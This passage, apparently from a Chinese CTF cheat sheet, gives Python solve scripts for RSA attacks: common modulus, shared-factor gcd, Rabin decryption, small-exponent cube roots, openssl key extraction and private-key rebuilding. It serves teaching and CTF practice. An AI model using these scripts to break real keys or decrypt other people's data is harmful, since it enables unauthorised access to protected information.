class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">797</span></span><br><span class="line">e2 = <span class="number">521</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930</span></span><br><span class="line">c2 = <span class="number">6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849</span></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><h4 id="共同公约数"><a href="#共同公约数" class="headerlink" title="共同公约数"></a>共同公约数</h4><p>前提：</p><p>如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将p和q分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1=<span class="number">9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span></span><br><span class="line"></span><br><span class="line">flag=gmpy2.gcd(n1,n2)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="十六进制与十进制转换"><a href="#十六进制与十进制转换" class="headerlink" title="十六进制与十进制转换"></a>十六进制与十进制转换</h4><p>十进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">n=<span class="number">30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511</span></span><br><span class="line">p=<span class="number">518629368090170828331048663550229634444384299751272939077168648935075604180676006392464524953128293842996441022771890719731811852948684950388211907532651941639114462313594608747413310447500790775078081191686616804987790818396104388332734677935684723647108960882771460341293023764117182393730838418468480006985768382115446225422781116531906323045161803441960506496275763429558238732127362521949515590606221409745127192859630468854653290302491063292735496286233738504010613373838035073995140744724948933839238851600638652315655508861728439180988253324943039367876070687033249730660337593825389358874152757864093</span></span><br><span class="line">q=<span class="number">57970027</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">7794723418575865133221710844957533763600341922604517613342495747603012554180094280541823023634873599126585279853308940496678282266476710442981516354722804125430496779901585048718048185233664790252394684332465074382441230073678600882729934579182285214951880877250418707254283530428901115269852700826395665491878667661628136001999399484533201783253765516767750014674954245926135408324886326143714299876277011335423927566142213389260930015587242338816401180184690143281167398845157288962617745058933037815909282349958256327539704772842249498887000705177364153517572284141825022022854893024073953342334031407154501829377</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">m=hex(int(pow(int(c),d,n)))</span><br><span class="line">flag=binascii.a2b_hex(m[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>十六进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math<span class="comment">#python2</span></span><br><span class="line">N=<span class="number">0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9f</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">d=<span class="number">0x9186c78d098af6815622ea9901cf84a89ead578a6dbdded7d7fc63531756239dc586501216fc2e4bd1a8cee7e62284d16d91195f356d733a52dff011ebc3bf1e5d62af54d0455ea2f6ec948f45f34931f5b0b4478b16c66951a95d2f069a6c8867a6bc673c8e40052a54dbc5c1aeacbbfae7cad150a4f41ef4a02b1c97d70636ae187ed3c45f2551696a6a1172ae4089e033fb4853057c0f1e227d71ccf24fb27073ca4fe4ac3744dfed2cd7763c47ac4ae4d42820a19d68961bc103bb9016197463875169d062b45807e2e86aa17fa65e3088cc75ef35f984d0ca92d4c9270c2e694eb1f5df16b7ebe32b5c1d26086d6aac5fe327288f2904cb54164db39151</span></span><br><span class="line">c=<span class="number">0x3dbf00a02f924a70f44bdd69e73c46241e9f036bfa49a0c92659d8eb0fe47e42068eaf156a9b3ee81651bc0576a91ffed48610c158dc8d2fb1719c7242704f0d965f8798304925a322c121904b91e5fc5eb3dc960b03eb8635be53b995217d4c317126e0ec6e9a9acfd5d915265634a22a612de962cfaa2e0443b78bdf841ff901423ef765e3d98b38bcce114fede1f13e223b9bd8155e913c8670d8b85b1f3bcb99353053cdb4aef1bf16fa74fd81e42325209c0953a694636c0ce0a19949f343dc229b2b7d80c3c43ebe80e89cbe3a3f7c867fd7cee06943886b0718a4a3584c9d9f9a66c9de29fda7cfee30ad3db061981855555eeac01940b1924eb4c301</span></span><br><span class="line">print(hex(pow(c,d,N))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="pem、-pub、flag-enc"><a href="#pem、-pub、flag-enc" class="headerlink" title=".pem、.pub、flag.enc"></a><code>.pem</code>、<code>.pub</code>、<code>flag.enc</code></h4><p>公钥：通常是以.pem或.pub结尾的文件。</p><p>密文：通常叫做flag.enc之类的。</p><p>私钥：pem文件</p><h5 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h5><h6 id="获取n和e"><a href="#获取n和e" class="headerlink" title="获取n和e"></a>获取n和e</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl</span><br><span class="line">OpenSSL&gt; rsa -pubin -text -modulus -<span class="keyword">in</span> /Users/apple/Downloads/mediumRSA/pubkey.pem</span><br><span class="line">Public-Key: (<span class="number">256</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    <span class="number">00</span>:c2:<span class="number">63</span>:<span class="number">6</span>a:e5:c3:d8:e4:<span class="number">3</span>f:fb:<span class="number">97</span>:ab:<span class="number">09</span>:<span class="number">02</span>:<span class="number">8</span>f:</span><br><span class="line">    <span class="number">1</span>a:ac:<span class="number">6</span>c:<span class="number">0</span>b:f6:cd:<span class="number">3</span>d:<span class="number">70</span>:eb:ca:<span class="number">28</span>:<span class="number">1</span>b:ff:e9:<span class="number">7</span>f:</span><br><span class="line">    be:<span class="number">30</span>:dd</span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+<span class="number">5</span>erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">OpenSSL&gt;</span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line"></span><br><span class="line">E=<span class="number">65537</span></span><br></pre></td></tr></table></figure><p>生成私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">keypair.q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = int((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>生成FLAG</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenSSL&gt; rsautl -decrypt -in &#x2F;root&#x2F;flag.enc -inkey &#x2F;root&#x2F;private.pem</span><br></pre></td></tr></table></figure><h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">public=RSA.importKey(open(<span class="string">&#x27;/Users/apple/Downloads/mediumRSA/pubkey.pem&#x27;</span>).read())</span><br><span class="line">n=public.n</span><br><span class="line">e=public.e</span><br><span class="line">print(n)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><h5 id="题型一"><a href="#题型一" class="headerlink" title="题型一"></a>题型一</h5><p>知道公钥(pubkey.pem)和密文(flag.enc)</p><p>openssl求出e、n，破解生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python2或者<span class="number">3</span></span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span>  </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span>  </span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/flag.enc&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    c = f.read().encode(<span class="string">&#x27;hex&#x27;</span>)  </span><br><span class="line">    c = int(c,<span class="number">16</span>)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>关于文件形式的密文c，一般都是16进制形式读取，接着再转为整型用于计算。</p><h5 id="题型二"><a href="#题型二" class="headerlink" title="题型二"></a>题型二</h5><p>两个文件public.key和flag.enc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> Crypto.PublicKey.RSA</span><br><span class="line"><span class="keyword">import</span> Crypto.Cipher.PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">10306247299477991196335954707897189353577589618180446614762218980226685668311143526740800444344046158260556585833057716406703213966249956775927205061731821632025483608182881492214855240841820024816859031176291364212054293818204399157346955465232586109199762630150640804366966946066155685218609638749171632685073</span>  </span><br><span class="line">p = <span class="number">97</span>  </span><br><span class="line">q = <span class="number">106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609</span></span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line">key=Crypto.PublicKey.RSA.construct(map(long,[n,e,d]))</span><br><span class="line">rsakey=Crypto.Cipher.PKCS1_OAEP.new(key)</span><br></pre></td></tr></table></figure><h4 id="唯独密文攻击"><a href="#唯独密文攻击" class="headerlink" title="唯独密文攻击"></a>唯独密文攻击</h4><p>唯密文攻击指的是在仅知已加密文字的情况下进行穷举攻击，把加法密码和乘法密码联合起来，就得到了所谓的仿射密码(affinecipher)—— 两种密码与一对密钥的组合。</p><p>思路：计算q=n/p,对比找出小的那个质数，找到n与200组密文的最大公约数即相当于对n做了分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;ciphertext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        res = re.findall(<span class="string">&#x27;^\d+&#x27;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> len(res) &gt; <span class="number">0</span>:</span><br><span class="line">            e.append(int(res[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="number">135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divisors</span>(<span class="params">m, n</span>):</span></span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> c != <span class="number">0</span>:</span><br><span class="line">        c = m % n</span><br><span class="line">        m = n</span><br><span class="line">        n = c</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        print(str(i + <span class="number">1</span>) + <span class="string">&#x27;:&#x27;</span> + str(divisors(n, e[i])))</span><br></pre></td></tr></table></figure><h4 id="低加密指数分解攻击"><a href="#低加密指数分解攻击" class="headerlink" title="低加密指数分解攻击"></a>低加密指数分解攻击</h4><p>前提：</p><p>e=2、密文已知。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">c = <span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span>  </span><br><span class="line">m = gmpy2.isqrt(c)  </span><br><span class="line">m = int(m)  </span><br><span class="line">m_text = libnum.n2s(m)  </span><br><span class="line">print(m_text)</span><br></pre></td></tr></table></figure><p>前提：</p><p>e=2 Rabin加密中的N可被分解。</p><figure class="highlight python"><figcaption><span>p y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">e = <span class="number">2</span>  </span><br><span class="line">n = <span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span>  </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span>  </span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span>  </span><br><span class="line">c=int(open(<span class="string">&#x27;/Users/apple/Downloads/hardRSA/flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)   </span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)  </span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)  </span><br><span class="line">yp=gmpy2.invert(p,q)  </span><br><span class="line">yq=gmpy2.invert(q,p)  </span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n  </span><br><span class="line">rr=n-r  </span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n  </span><br><span class="line">ss=n-s  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure><h4 id="小明文攻击"><a href="#小明文攻击" class="headerlink" title="小明文攻击"></a>小明文攻击</h4><p>前提：</p><p>e较小，一般为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#适用情况:e较小,一般为3</span></span><br><span class="line"><span class="comment">#公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span>    </span><br><span class="line">e=<span class="number">3</span>    </span><br><span class="line">res=<span class="number">0</span>   <span class="comment">#res是m  </span></span><br><span class="line">c=int(open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)    </span><br><span class="line"><span class="keyword">print</span> time.asctime()    </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):    </span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:    </span><br><span class="line">        res=gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">0</span>]    </span><br><span class="line">        <span class="keyword">print</span> k,res    </span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(res)    </span><br><span class="line">        <span class="keyword">print</span> time.asctime()    </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h4><p>前提：</p><p>存在两个或更多模数 ，且gcd(N1,N2)!=1 也就是N1和N2不互质。</p><p>判断是否互为素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):  </span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    x = <span class="number">20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951</span> </span><br><span class="line">    y = <span class="number">18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727</span>  </span><br><span class="line">    <span class="keyword">if</span> gcd(x,y)==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 